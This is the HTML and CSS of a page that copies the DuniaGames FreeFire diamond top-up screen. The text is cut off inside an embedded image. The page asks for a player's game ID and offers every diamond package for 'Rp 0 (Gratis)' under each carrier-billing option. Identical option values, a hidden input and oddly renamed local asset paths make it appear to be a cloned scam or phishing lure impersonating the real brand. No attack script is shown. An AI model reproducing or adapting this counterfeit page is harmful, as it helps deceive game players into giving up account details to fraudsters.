            .paymentPopupInfo .paymentInfo-step h3,
            .paymentPopupInfo .wrap-titleDialog h3 {
                font-weight: 600;
                font-family: Montserrat;
                margin-top: 15px
            }
            .paymentPopupInfo .paymentInfo-step,
            .paymentPopupInfo .wrap-titleDialog {
                margin-bottom: 10px
            }
        }

        .paymentPopupInfo.popup-WrapDialog {
            margin: 0;
            max-height: 90vh;
            overflow: auto
        }

        .paymentPopupInfo.popup-WrapDialog::-webkit-scrollbar {
            width: 5px;
            background: #2d2e32
        }

        .paymentPopupInfo.popup-WrapDialog::-webkit-scrollbar-thumb {
            background-color: #3d3e42;
            opacity: .5
        }

        @media only screen and (max-width:992px) {
            .paymentPopupInfo .visible-md {
                display: none !important
            }
        }

        @media only screen and (min-width:991px) {
            .paymentPopupInfo .visible-md {
                display: block !important
            }
            .paymentPopupInfo .hidden-md {
                display: none !important
            }
        }

        @media only screen and (max-width:992px) {
            .paymentPopupInfo .hidden-md {
                display: block !important
            }
        }

        .paymentPopupInfo .option-twoSide p {
            margin: 0 15px 15px 0;
            margin-bottom: 15px !important;
            width: calc(50% - (15px/2));
            display: inline-block;
            float: left;
            border: 2px solid #3c3c44;
            padding: 13px;
            text-align: center !important;
            border-radius: 3px;
            font-size: 12px;
            transition: all .3s ease-in-out;
            cursor: pointer
        }

        .paymentPopupInfo .option-twoSide p:nth-child(2n+2) {
            margin-right: 0
        }

        .paymentPopupInfo .option-twoSide p.active {
            background: #323339;
            border: 2px solid #6a707d
        }

        .mat-dialog-form-payment .mat-dialog-container {
            background: #25262b;
            color: #fff;
            box-shadow: unset;
            position: relative;
            padding: 0 !important;
            width: 500px !important;
            overflow-x: hidden;
            overflow-y: hidden
        }

        @media (max-width:991px) {
            .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-confirm {
                padding-top: 5px;
                padding-bottom: 20px
            }
            .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-confirm h4,
            .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-confirm p {
                font-size: 12px
            }
            .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-confirm p {
                margin-bottom: 20px
            }
            .popup-WrapDialog .container-paymentInfo .wrap-paymentInfo.wrap-paymentInfo-confirm .btn-red {
                margin-bottom: 15px;
                font-size: 14px
            }
            .paymentPopupInfo.popup-WrapDialog {
                max-height: 100%
            }
            .mat-dialog-form-payment .mat-dialog-container {
                width: 100%
            }
            .cdk-overlay-pane {
                max-width: 100vw !important;
                width: 100%;
                height: 100%
            }
        }

        .toast-message span {
            font-family: Montserrat;
            font-size: 14px
        }

        .err {
            text-align: center;
            margin-top: -70px !important
        }

        @media (max-width:767px) {
            .err {
                margin-top: -25px !important
            }
            .err__lbl {
                margin-top: unset
            }
        }

        .err__lbl {
            text-align: unset;
            margin-top: unset
        }

        .fa-check-circle-o {
            color: green
        }
    </style>
</head>

<body style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">



    <app-root _nghost-gtc-c0="" ng-version="7.2.16">
        <div _ngcontent-gtc-c0="" class="layout-content">
            <app-loader _ngcontent-gtc-c0="" _nghost-gtc-c1="">
                <div _ngcontent-gtc-c1="" class="loading-block"><img  _ngcontent-gtc-c1="" src="https://duniagames.co.id/assets/images/DG-Loading-Icons.gif"></div>
            </app-loader>
            <app-toast _ngcontent-gtc-c0="" _nghost-gtc-c2="" class="ng-tns-c2-0">
                <div _ngcontent-gtc-c2="" class="toast">
                    <!---->
                </div>
            </app-toast>
            <router-outlet _ngcontent-gtc-c0=""></router-outlet>
            <app-landing-payment-voucher-new _nghost-gtc-c19="" class="ng-star-inserted">
                <!---->
                <div _ngcontent-gtc-c19="" class="container-wrapper-topup ng-star-inserted">
                    <app-header _ngcontent-gtc-c19="">
                        <header class="site-header active">
                            <div class="container">
                                <div class="row">
                                    <div class="col-md-12">
                                        <div class="site-header__item site-header__item--left">
                                            <div class="site-header__item__brand">
                                                <a href="/">
                                                    <!----><img style="width: 100px;" alt="" src="https://duniagames.co.id/assets/images/primary-logo.jpg" class="ng-star-inserted"></a>
                                            </div>
                                        </div>
                                        <div class="site-header__item site-header__item--middle">
                                            <div class="site-header__item__nav">
                                                <ul id="navigation">
                                                    <!---->
                                                    <li class="dropdown ng-star-inserted">
                                                        <!----><a href="/home" class="ng-star-inserted" style="font-family: 'Roboto', sans-serif;">Home</a>
                                                        <!---->
                                                        <ul class="isi-dropdown">
                                                            <!---->
                                                        </ul>
                                                    </li>
                                                    <li class="dropdown ng-star-inserted active">
                                                        <!----><a href="/top-up" class="ng-star-inserted" style="font-family: 'Roboto', sans-serif;">Top Up</a>
                                                        <!---->
                                                        <ul class="isi-dropdown">
                                                            <!---->
                                                        </ul>
                                                    </li>
                                                    <li class="dropdown ng-star-inserted">
                                                        <!----><a href="/discover" class="ng-star-inserted" style="font-family: 'Roboto', sans-serif;">Discover</a>
                                                        <!---->
                                                        <ul class="isi-dropdown">
                                                            <!---->
                                                        </ul>
                                                    </li>
                                                    <li class="dropdown ng-star-inserted">
                                                        <!----><a href="/esports" class="ng-star-inserted" style="font-family: 'Roboto', sans-serif;">ESPORTS</a>
                                                        <!---->
                                                        <ul class="isi-dropdown">
                                                            <!---->
                                                            <li style="width: 100%" class="ng-star-inserted"><a style="font-family: 'Roboto', sans-serif;" href="/esports">IKUTI &amp; BUAT TURNAMEN</a></li>
                                                            <li style="width: 100%" class="ng-star-inserted"><a style="font-family: 'Roboto', sans-serif;" href="/tournament-events">TURNAMEN &amp; EVENT</a></li>
                                                        </ul>
                                                    </li>
                                                    <li class="dropdown ng-star-inserted">
                                                        <!----><a href="/chat" class="ng-star-inserted" style="font-family: 'Roboto', sans-serif;">Forum</a>
                                                        <!---->
                                                        <ul class="isi-dropdown">
                                                            <!---->
                                                        </ul>
                                                    </li>
                                                    <li class="dropdown ng-star-inserted">
                                                        <!---->
                                                        <!----><a style="font-family: 'Roboto', sans-serif;" href="/tournament-leaderboard/search?regionId=all&amp;gameId=all&amp;page=1" class="ng-star-inserted">Leaderboard</a>
                                                        <ul class="isi-dropdown">
                                                            <!---->
                                                        </ul>
                                                    </li>
                                                </ul>
                                            </div>
                                        </div>
                                        <div class="site-header__item site-header__item--right">
                                            <div class="language"><select style="font-family: 'Roboto', sans-serif;"><!----><option value="id" class="ng-star-inserted" style="font-family: 'Roboto', sans-serif;">ID </option></select><span><i class="fa fa-angle-down"></i></span></div>
                                            <!---->
                                            <!---->
                                            <div class="before-login ng-star-inserted">
                                                <div class="site-header__item__auth site-header__item__auth--search"><button><img alt="" src="./a.assets/.images/.icons/search.png"></button></div>
                                                <div class="login-btn"><a style="font-family: 'Roboto', sans-serif;">Login /</a></div>
                                                <div class="register-btn"><a href="#" style="font-family: 'Roboto', sans-serif;">daftar</a></div>
                                            </div>
                                        </div>
                                        <div class="mobile-menu visible-tablet">
                                            <div class="mobile-menu__item">
                                                <div class="language"><select><!----><option value="id" class="ng-star-inserted">ID </option><option value="en" class="ng-star-inserted">EN </option></select><span><i class="fa fa-angle-down"></i></span></div>
                                            </div>
                                            <div class="mobile-menu__item"><button><i aria-hidden="true" class="fa fa-search search-tabs"></i></button>
                                                <!---->
                                            </div>
                                            <div class="mobile-menu__item"><button class="btn-menu"><span class="btn-menu__item"></span></button></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="pop-mobile-menu visible-tablet">
                                <!---->
                                <ul class="mob-list list-unstyled">
                                    <!---->
                                    <li class="ng-star-inserted">
                                        <!----><a href="/home" class="ng-star-inserted" style="font-family: 'Roboto', sans-serif;">Home</a>
                                        <!---->
                                        <!---->
                                    </li>
                                    <li class="ng-star-inserted active">
                                        <!----><a href="/top-up" class="ng-star-inserted" style="font-family: 'Roboto', sans-serif;">Top Up</a>
                                        <!---->
                                        <!---->
                                    </li>
                                    <li class="ng-star-inserted">
                                        <!----><a href="/discover" class="ng-star-inserted" style="font-family: 'Roboto', sans-serif;">Discover</a>
                                        <!---->
                                        <!---->
                                    </li>
                                    <li class="ng-star-inserted">
                                        <!----><a href="/esports" class="ng-star-inserted" style="font-family: 'Roboto', sans-serif;">ESPORTS</a>
                                        <!---->
                                        <!---->
                                        <ul class="list-decoration ng-star-inserted">
                                            <li style="width: 100%"><a href="/esports" style="font-family: 'Roboto', sans-serif;">IKUTI &amp; BUAT TURNAMEN</a></li>
                                        </ul>
                                        <ul class="list-decoration ng-star-inserted">
                                            <li style="width: 100%"><a href="/tournament-events" style="font-family: 'Roboto', sans-serif;">TURNAMEN &amp; EVENT</a></li>
                                        </ul>
                                    </li>
                                    <li class="ng-star-inserted">
                                        <!----><a href="/chat" class="ng-star-inserted" style="font-family: 'Roboto', sans-serif;">Forum</a>
                                        <!---->
                                        <!---->
                                    </li>
                                    <li class="ng-star-inserted">
                                        <!---->
                                        <!----><a style="font-family: 'Roboto', sans-serif;" href="/tournament-leaderboard/search?regionId=all&amp;gameId=all&amp;page=1" class="ng-star-inserted">Leaderboard</a>
                                        <!---->
                                    </li>
                                    <li><a href="/mini-game" style="font-family: 'Roboto', sans-serif;">Mini Games</a></li>
                                    <li>
                                        <!---->
                                        <!---->
                                    </li><br></ul>
                                <!---->
                                <!---->
                                <div class="before-login ng-star-inserted">
                                    <div class="login-btn" style="font-family: 'Roboto', sans-serif;"><a>Login /</a></div>
                                    <div class="register-btn"><a href="/newregister" style="font-family: 'Roboto', sans-serif;">daftar</a></div>
                                </div>
                            </div>
                            <!---->
                            <!---->
                        </header>
                    </app-header>
                    <!---->
                    <section _ngcontent-gtc-c19="" class="payment-voucher">
                        <div _ngcontent-gtc-c19="" class="second-background" style="background-image: url(&quot;https://api.duniagames.co.id/api/product/upload/image/9231439531578882989.jpg&quot;);"></div>
                        <div _ngcontent-gtc-c19="" class="container">
                            <div _ngcontent-gtc-c19="" class="dg-payment-banner">
                                <div _ngcontent-gtc-c19="" class="row">
                                    <div _ngcontent-gtc-c19="" class="col-md-6 col-md-push-0 box-rightPayment fadeInRight">
                                        <div _ngcontent-gtc-c19="" class="wrapper-MaainLogo visible-xs">
                                            <div _ngcontent-gtc-c19="" class="con-card-voucher"><img _ngcontent-gtc-c19="" alt="logo" class="game-image" src="https://api.duniagames.co.id/api/product/upload/image/13838880871566571420.jpg"></div>
                                            <div _ngcontent-gtc-c19="" class="wrapper-title">
                                                <h2 _ngcontent-gtc-c19="" class="title" style="font-family: 'Roboto', sans-serif;"><b _ngcontent-gtc-c19="" >FreeFire</b></h2>
                                            </div>
                                        </div>
                                        <div _ngcontent-gtc-c19="">
                                            <form _ngcontent-gtc-c19="" novalidate="" class="ng-dirty ng-valid ng-touched">
                                                <div _ngcontent-gtc-c19="" class="card-body box-paymentVoucher">
                                                    <ul _ngcontent-gtc-c19="">
                                                        <!---->
                                                        <li _ngcontent-gtc-c19="" class="ng-star-inserted" style="font-family: 'Roboto', sans-serif;">
                                                            <h3 _ngcontent-gtc-c19=""><b _ngcontent-gtc-c19=""><span style="font-family: 'Roboto', sans-serif;">1. Masukkan Game ID FreeFire Anda</span></b></h3>
                                                            <h6 _ngcontent-gtc-c19="" style="font-family: 'Roboto', sans-serif;">Silahkan anda mengisi dengan game ID anda, contoh : 213123123</h6>
                                                            <!---->
                                                            <!---->
                                                            <div _ngcontent-gtc-c19="" class="form-group ng-star-inserted">
                                                                <!----><input _ngcontent-gtc-c19="" id="playerId" style="font-family: 'Roboto', sans-serif;" class="form-control border-formControl ng-star-inserted ng-dirty ng-valid ng-touched" formcontrolname="userid" pattern="\d*" type="number" placeholder="Silakan Masukkan ID Anda"
                                                                          
                                                                maxlength="25">
                                                                <input type="hidden" id="saveItem">
                                                                <!---->
                                                                <app-error-message _ngcontent-eet-c5=""><!----><div class="invalid-feedback ng-star-inserted" style="display: none;"><label style="font-family: 'Roboto', sans-serif;" class="error-label">Field ini wajib diisi</label></div></app-error-message>
                                                            </div>
                                                            <!---->
                                                        </li>
                                                        <li _ngcontent-gtc-c19="">
                                                            <h3 _ngcontent-gtc-c19=""><b _ngcontent-gtc-c19="" style="font-family: 'Roboto', sans-serif;">2. Pilih jumlah diamond yang ingin anda beli</b></h3>
                                                            <!---->
                                                            <div _ngcontent-gtc-c19="" class="ng-star-inserted">
                                                                <!---->
                                                                <!---->
                                                                <!---->
                                                                <!---->
                                                                <div _ngcontent-gtc-c19="" appitemheight="" class="group-item clearfix">
                                                                    <!---->
                                                                    <div _ngcontent-gtc-c19="" class="ng-star-inserted 5dm wrapper-item">
                                                                         <p _ngcontent-gtc-c19="" >5 Diamond</p>
                                                                        <input _ngcontent-gtc-c19="" class="valueOptionProduct" name="ValueOptionProduct" type="radio" value="16"></div>
                                                                    <div _ngcontent-gtc-c19="" class="ng-star-inserted 70dm wrapper-item">
                                                                         <p _ngcontent-gtc-c19="" >70 Diamond</p>
                                                                        <input _ngcontent-gtc-c19="" class="valueOptionProduct" name="ValueOptionProduct" type="radio" value="16"></div>
                                                                    <div _ngcontent-gtc-c19="" class="ng-star-inserted 355dm wrapper-item">
                                                                         <p _ngcontent-gtc-c19="" >355 Diamond</p>
                                                                        <input _ngcontent-gtc-c19="" class="valueOptionProduct" name="ValueOptionProduct" type="radio" value="16"></div>
                                                                        <div _ngcontent-gtc-c19="" class="ng-star-inserted 720dm wrapper-item">
                                                                         <p _ngcontent-gtc-c19="" >720 Diamond</p>
                                                                        <input _ngcontent-gtc-c19="" class="valueOptionProduct" name="ValueOptionProduct" type="radio" value="16"></div>
                                                                        <div _ngcontent-gtc-c19="" class="ng-star-inserted 1450dm wrapper-item">
                                                                         <p _ngcontent-gtc-c19="" >1450 Diamond</p>
                                                                        <input _ngcontent-gtc-c19="" class="valueOptionProduct" name="ValueOptionProduct" type="radio" value="16"></div>
                                                                        <div _ngcontent-gtc-c19="" class="ng-star-inserted 3250dm wrapper-item">
                                                                         <p _ngcontent-gtc-c19="" >3250 Diamond</p>
                                                                        <input _ngcontent-gtc-c19="" class="valueOptionProduct" name="ValueOptionProduct" type="radio" value="16"></div>
                                                                </div>
                                                            </div>
                                                            <!---->
                                                        </li>
                                                        <!---->
                                                        <li _ngcontent-gtc-c19="" class="ng-star-inserted" id="showPayment" style="display: none;">
                                                            <h3 _ngcontent-gtc-c19=""><b _ngcontent-gtc-c19="" style="font-family: 'Roboto', sans-serif;">3. Pilih Metode Pembayaran</b></h3>
                                                            <div _ngcontent-gtc-c19="" class="row payment-card">
                                                                <!---->
                                                                <div _ngcontent-gtc-c19="" class="ng-star-inserted">
                                                                    <div _ngcontent-gtc-c19="" class="col-md-12 col-xs-12 payment-card__box wow fadeInUp" style="visibility: visible;">
                                                                        <div _ngcontent-gtc-c19="" class="payment-card__reebon">
                                                                            <p _ngcontent-gtc-c19="">Promo</p>
                                                                        </div>
                                                                        <div _ngcontent-gtc-c19="" class="payment-card__reebon">
                                                                            <p _ngcontent-gtc-c19="">foryou</p>
                                                                        </div>
                                                                        <div _ngcontent-gtc-c19="" class="payment-card__reebon">
                                                                            <p _ngcontent-gtc-c19="">Bonus</p>
                                                                        </div>
                                                                        <div _ngcontent-gtc-c19="" class="row payment-card__first--section">
                                                                            <div _ngcontent-gtc-c19="" class="col-md-6 col-xs-6">
                                                                                <div _ngcontent-gtc-c19="" class=" payment-card__image"><img _ngcontent-gtc-c19="" src="https://api.duniagames.co.id/api/product/upload/image/16285701571564150217.png"></div>
                                                                            </div>
                                                                            <div _ngcontent-gtc-c19="" class="col-md-6 col-xs-6">
                                                                                <div _ngcontent-gtc-c19="" class="payment-card__price">
                                                                                    <p _ngcontent-gtc-c19="" class="payment-card__price--discond"> Discount 100% Rp 0 ( Gratis )</p>
                                                                                    <p _ngcontent-gtc-c19="" class="payment-card__price--label" style="font-family: 'Roboto', sans-serif;"> Rp 0 ( Gratis )</p>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-gtc-c19="" class="row payment-card__last--section">
                                                                            <div _ngcontent-gtc-c19="" class="col-md-8 col-xs-8">
                                                                                <div _ngcontent-gtc-c19="" class="payment-card__label--paywith">
                                                                                    <!---->
                                                                                    <!---->
                                                                                    <p _ngcontent-gtc-c19="" class="ng-star-inserted" style="font-family: 'Roboto', sans-serif;"> Bayar dengan pulsa telkomsel</p>
                                                                                    <!---->
                                                                                    <!---->
                                                                                    <!---->
                                                                                </div>
                                                                            </div>
                                                                            <div _ngcontent-gtc-c19="" class="col-md-4 col-xs-4">
                                                                                <div _ngcontent-gtc-c19="" class="payment-card__buy--button"><button _ngcontent-gtc-c19="" type="button" id="doBuy" value="buy" style="font-family: 'Roboto', sans-serif;">BELI</button></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div _ngcontent-gtc-c19="" class="ng-star-inserted">
                                                                    <div _ngcontent-gtc-c19="" class="col-md-12 col-xs-12 payment-card__box wow fadeInUp current" style="visibility: visible;">
                                                                        <div _ngcontent-gtc-c19="" class="payment-card__reebon">
                                                                            <p _ngcontent-gtc-c19="">Promo</p>
                                                                        </div>
                                                                        <div _ngcontent-gtc-c19="" class="payment-card__reebon">
                                                                            <p _ngcontent-gtc-c19="">foryou</p>
                                                                        </div>
                                                                        <div _ngcontent-gtc-c19="" class="payment-card__reebon">
                                                                            <p _ngcontent-gtc-c19="">Bonus</p>
                                                                        </div>
                                                                        <div _ngcontent-gtc-c19="" class="row payment-card__first--section">
                                                                            <div _ngcontent-gtc-c19="" class="col-md-6 col-xs-6">
                                                                                <div _ngcontent-gtc-c19="" class=" payment-card__image"><img _ngcontent-gtc-c19="" src="https://api.duniagames.co.id/api/product/upload/image/3052151371555391360.png"></div>
                                                                            </div>
                                                                            <div _ngcontent-gtc-c19="" class="col-md-6 col-xs-6">
                                                                                <div _ngcontent-gtc-c19="" class="payment-card__price">
                                                                                    <p _ngcontent-gtc-c19="" class="payment-card__price--discond" style="font-family: 'Roboto', sans-serif;"> Discount 100% Rp 0 ( Gratis )</p>
                                                                                    <p _ngcontent-gtc-c19="" class="payment-card__price--label" style="font-family: 'Roboto', sans-serif;"> Rp 0 ( Gratis )</p>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-gtc-c19="" class="row payment-card__last--section">
                                                                            <div _ngcontent-gtc-c19="" class="col-md-8 col-xs-8">
                                                                                <div _ngcontent-gtc-c19="" class="payment-card__label--paywith">
                                                                                    <!---->
                                                                                    <!---->
                                                                                    <p _ngcontent-gtc-c19="" class="ng-star-inserted" style="font-family: 'Roboto', sans-serif;"> Bayar dengan pulsa xl</p>
                                                                                    <!---->
                                                                                    <!---->
                                                                                    <!---->
                                                                                </div>
                                                                            </div>
                                                                            <div _ngcontent-gtc-c19="" class="col-md-4 col-xs-4">
                                                                                <div _ngcontent-gtc-c19="" class="payment-card__buy--button"><button _ngcontent-gtc-c19="" type="button" id="doBuy" value="buy" style="font-family: 'Roboto', sans-serif;">BELI</button></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div _ngcontent-gtc-c19="" class="ng-star-inserted">
                                                                    <div _ngcontent-gtc-c19="" class="col-md-12 col-xs-12 payment-card__box wow fadeInUp" style="visibility: visible;">
                                                                        <div _ngcontent-gtc-c19="" class="payment-card__reebon">
                                                                            <p _ngcontent-gtc-c19="">Promo</p>
                                                                        </div>
                                                                        <div _ngcontent-gtc-c19="" class="payment-card__reebon">
                                                                            <p _ngcontent-gtc-c19="">foryou</p>
                                                                        </div>
                                                                        <div _ngcontent-gtc-c19="" class="payment-card__reebon">
                                                                            <p _ngcontent-gtc-c19="">Bonus</p>
                                                                        </div>
                                                                        <div _ngcontent-gtc-c19="" class="row payment-card__first--section">
                                                                            <div _ngcontent-gtc-c19="" class="col-md-6 col-xs-6">
                                                                                <div _ngcontent-gtc-c19="" class=" payment-card__image"><img _ngcontent-gtc-c19="" src="https://api.duniagames.co.id/api/product/upload/image/20065278901566884383.png"></div>
                                                                            </div>
                                                                            <div _ngcontent-gtc-c19="" class="col-md-6 col-xs-6">
                                                                                <div _ngcontent-gtc-c19="" class="payment-card__price">
                                                                                    <p _ngcontent-gtc-c19="" class="payment-card__price--discond" style="font-family: 'Roboto', sans-serif;"> Discount 100% Rp 0 ( Gratis )</p>
                                                                                    <p _ngcontent-gtc-c19="" class="payment-card__price--label" style="font-family: 'Roboto', sans-serif;"> Rp 0 ( Gratis )</p>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-gtc-c19="" class="row payment-card__last--section">
                                                                            <div _ngcontent-gtc-c19="" class="col-md-8 col-xs-8">
                                                                                <div _ngcontent-gtc-c19="" class="payment-card__label--paywith">
                                                                                    <!---->
                                                                                    <!---->
                                                                                    <p _ngcontent-gtc-c19="" class="ng-star-inserted" style="font-family: 'Roboto', sans-serif;"> Bayar dengan pulsa tri</p>
                                                                                    <!---->
                                                                                    <!---->
                                                                                    <!---->
                                                                                </div>
                                                                            </div>
                                                                            <div _ngcontent-gtc-c19="" class="col-md-4 col-xs-4">
                                                                                <div _ngcontent-gtc-c19="" class="payment-card__buy--button"><button _ngcontent-gtc-c19="" type="button" id="doBuy" value="buy" style="font-family: 'Roboto', sans-serif;">BELI</button></div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div _ngcontent-gtc-c19="" class="ng-star-inserted">
                                                                    <div _ngcontent-gtc-c19="" class="col-md-12 col-xs-12 payment-card__box wow fadeInUp" style="visibility: visible;">
                                                                        <div _ngcontent-gtc-c19="" class="payment-card__reebon">
                                                                            <p _ngcontent-gtc-c19="">Promo</p>
                                                                        </div>
                                                                        <div _ngcontent-gtc-c19="" class="payment-card__reebon">
                                                                            <p _ngcontent-gtc-c19="">foryou</p>
                                                                        </div>
                                                                        <div _ngcontent-gtc-c19="" class="payment-card__reebon">
                                                                            <p _ngcontent-gtc-c19="">Bonus</p>
                                                                        </div>
                                                                        <div _ngcontent-gtc-c19="" class="row payment-card__first--section">
                                                                            <div _ngcontent-gtc-c19="" class="col-md-6 col-xs-6">
                                                                                <div _ngcontent-gtc-c19="" class=" payment-card__image"><img _ngcontent-gtc-c19="" src="data:image/png;base64,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